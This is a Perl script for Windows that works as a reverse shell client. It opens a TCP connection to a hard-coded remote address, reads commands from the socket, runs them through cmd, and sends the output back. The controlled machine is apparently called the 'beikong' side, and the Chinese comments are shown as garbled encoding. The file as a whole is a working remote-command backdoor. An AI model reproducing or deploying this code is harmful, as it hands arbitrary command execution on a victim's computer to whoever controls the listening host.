
#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket;
use IO::Select;
use Socket;
use Win32::Job;

my $g={};
&init_display();
sub init_display{
	open(F,"language\\china.txt");
	while(<F>){
		if(/\{(.+)\}=(.+)/){
			$g->{display}->{$1}=$2;
		}
	}
	close(F);
}

#####��������#####
my $variables={"host" =>"",
               "port" =>"",
	           "sock" => "",
	           "select" => "",
               "cmd" => "",
	           "command" => "",
	          };
####�����������####
$variables->{"host"}=$ARGV[0] || '192.168.1.108';
$variables->{"port"}=$ARGV[1] || 2008;
print "connect: $variables->{host} $variables->{port}\n";
###SOCKET��������###
######SOCKET�����ɹ�������Զ�سɹ�######
$variables->{"sock"}=new IO::Socket::INET(PeerAddr=>$variables->{"host"},
						   PeerPort=>$variables->{"port"},
                           Proto =>'TCP',
						   Timeout=>5,
	                       ) or die "connect err";
$variables->{"select"}=IO::Select->new($variables->{"sock"});
print "connect ok!\n";
print "CMD>";
my $sock=$variables->{"sock"};
my $select=$variables->{"select"};
#���²��ֽ���ѭ����Զ�̶�����ж�д����
#while($variables->{"sock"}){
while($select->can_read()) {
$variables->{"command"}="";
sysread $sock,$variables->{"command"},10000;
chomp($variables->{"command"});
#print "������Ϣ��".$variables->{"command"}."\n";
unless($variables->{"command"}) {
				close($variables->{"sock"});
				exit(1);
			}
print "$variables->{\"command\"}\n";

&shell($variables->{"command"});
}
#}


sub shell{
my $in=shift;
my @cmd;

$in=&Delspace($in); #�Խ��ܵ�����ȥ���س����кͿո�
		if($in eq "exit"){
			print $sock "exit";
			close($variables->{"sock"});
			exit(1);
		}
		else{
			if($in eq "cls"){system("cls");print $sock "cls";
						    }
			elsif($in=~/^([\w]:)$/ or $in=~/^cd[\s]*(.+)$/){  #���ڳ��������е��õ������������ʱ�Ե�shell ��Ҫ�ı䵱ǰ·����Ҫ����ϵͳ���������ԡ�����
				if(chdir($1)){
					@cmd=`echo %cd%`;print $sock "CMD>\n@cmd\n";
				}
				else{
					@cmd="$g->{display}->{file_beikong_nofind_path}��";print $sock "CMD>\n@cmd\n";
				}
			}
			else{	
				my $f="cmd_temp.txt";
				#ֻҪ����cd ����ͽ��������������ڴ˽���
				my $job = Win32::Job->new;
				$job->spawn('cmd',"cmd /c $in",{
						stdout => $f, 
						stderr => $f
				});  #����һ��job �����������ͨ����job�����������Ϣд�뵽$f�� ������������к�û���������أ��ж����������һ�����ڳ���
				my $ok=$job->run(1);
				if($ok){#�������ɹ����ء�
					open(F,$f);
					while(<F>){push @cmd,$_;}
					close(F);
					@cmd="$g->{display}->{file_beikong_input_donot_space}!" unless(@cmd);
					print $sock "CMD>\n@cmd\n";
					print @cmd;

				}
				else{
					print $sock "CMD>\n@cmd\n";
					print @cmd;
				}	
				unlink $f;
			}
		
		}
}

sub Delspace{
#	��������:�����������ȥ���ո�ͻس�������ݡ�
	my $s=shift;
	$s=~s/^\s+//;
	$s=~s/\s+$//s;
	$s=~s/\r$//;
	return $s;
}





